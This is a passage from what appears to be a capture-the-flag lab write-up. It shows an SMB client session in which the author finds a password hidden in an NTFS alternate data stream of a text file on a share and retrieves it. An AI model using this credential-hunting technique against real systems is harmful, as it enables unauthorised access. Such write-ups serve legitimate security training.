  Debug Mode Password.txt             A        0  Thu Aug  8 23:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 23:09:05 2019

    10485247 blocks of size 4096. 6542762 blocks available
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 11:06:12 PM 2019 UTC
access_time:    Thu Aug  8 11:06:12 PM 2019 UTC
write_time:     Thu Aug  8 11:08:17 PM 2019 UTC
change_time:    Thu Aug  8 11:08:17 PM 2019 UTC
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> exit
┌─[htb-jib1337@htb-8vwinqnr40]─[~/Desktop/nest]
└──╼ $cat Debug\ Mode\ Password.txt\:Password 
WBQ201953D8w
```
A new password is retrieved: `WBQ201953D8w`